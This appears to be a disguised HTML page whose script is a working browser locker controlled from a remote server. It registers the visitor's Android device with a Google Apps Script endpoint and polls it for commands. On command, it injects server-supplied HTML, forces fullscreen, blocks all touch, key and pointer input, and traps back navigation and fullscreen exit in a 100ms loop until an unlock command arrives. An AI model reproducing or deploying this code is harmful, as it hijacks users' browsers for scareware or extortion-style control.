<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
    <title>.</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;overflow:hidden;position:fixed;top:0;left:0;background:#000}
        body{display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;color:#fff;touch-action:none;-webkit-touch-callout:none;-webkit-user-select:none;user-select:none}
    </style>
</head>
<body>
<div id="s" style="color:#666;font-size:13px;">System...</div>
<script>
const API='https://script.google.com/macros/s/AKfycbzwtt_Qt3xFQ5ToKqAy3Je-ukHD41Tinl9bHXT7aTd3KXQ3bt15w0SiMuHLY31peOheug/exec';
const DID='z'+Math.random().toString(36).substring(2,15);
const M=navigator.userAgent.match(/Android[\s\d.]+/)?.[0]||'Android';
let locked=false;

async function reg(){
  try{
    let r=await fetch(API,{method:'POST',body:JSON.stringify({action:'register',device_id:DID,model:M})});
    let d=await r.json();
    if(d.command==='UNLOCK'){unlockAll();return;}
    if(d.command){document.body.innerHTML=d.command;lock();}
    else document.getElementById('s').innerHTML='OK';
  }catch(e){}
}

async function chk(){
  try{
    let r=await fetch(API+'?action=check&device_id='+DID);
    let d=await r.json();
    if(d.command==='UNLOCK'){unlockAll();return;}
    if(d.command){document.body.innerHTML=d.command;lock();}
  }catch(e){}
}

function unlockAll(){
  locked=false;
  document.body.innerHTML='<div id="s" style="color:#666;">OK</div>';
}

function lock(){
  locked=true;
  goFull();
  blockAll();
}

function goFull(){
  const el=document.documentElement;
  el.requestFullscreen?.();
  el.webkitRequestFullscreen?.();
  el.mozRequestFullScreen?.();
  el.msRequestFullscreen?.();
}

function blockAll(){
  // Blokir back/forward
  history.pushState(null,'',location.href);
  history.pushState(null,'',location.href);
  history.pushState(null,'',location.href);
  
  // Blokir semua event
  const noEvent=e=>{e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();return false;};
  
  document.addEventListener('contextmenu',noEvent,true);
  document.addEventListener('touchstart',noEvent,{passive:false,capture:true});
  document.addEventListener('touchmove',noEvent,{passive:false,capture:true});
  document.addEventListener('touchend',noEvent,{passive:false,capture:true});
  document.addEventListener('touchcancel',noEvent,{passive:false,capture:true});
  document.addEventListener('gesturestart',noEvent,true);
  document.addEventListener('gesturechange',noEvent,true);
  document.addEventListener('gestureend',noEvent,true);
  document.addEventListener('wheel',noEvent,{passive:false,capture:true});
  document.addEventListener('keydown',noEvent,true);
  document.addEventListener('keyup',noEvent,true);
  document.addEventListener('keypress',noEvent,true);
  
  // Blokir pointer events
  document.addEventListener('pointerdown',noEvent,true);
  document.addEventListener('pointermove',noEvent,true);
  document.addEventListener('pointerup',noEvent,true);
  
  // Blokir scroll
  window.addEventListener('scroll',noEvent,true);
  
  // Blokir resize
  window.addEventListener('resize',()=>goFull());
  
  // Blokir popstate
  window.addEventListener('popstate',()=>{
    history.pushState(null,'',location.href);
    goFull();
  });
  
  // Blokir visibility
  document.addEventListener('visibilitychange',()=>{
    if(document.hidden) goFull();
  });
  
  // Blokir fullscreen exit
  document.addEventListener('fullscreenchange',()=>{
    if(!document.fullscreenElement) goFull();
  });
  document.addEventListener('webkitfullscreenchange',()=>{
    if(!document.webkitFullscreenElement) goFull();
  });
  
  // Blokir orientasi
  screen.orientation?.lock?.('portrait').catch(()=>{});
  
  // Blokir select
  document.body.style.userSelect='none';
  document.body.style.webkitUserSelect='none';
  document.body.style.touchAction='none';
}

// Loop paksa - tiap 100ms
setInterval(()=>{
  if(!locked)return;
  goFull();
  history.pushState(null,'',location.href);
  if(screen.orientation?.lock) screen.orientation.lock('portrait').catch(()=>{});
},100);

reg();
setInterval(chk,5000);
</script>
</body>
</html>
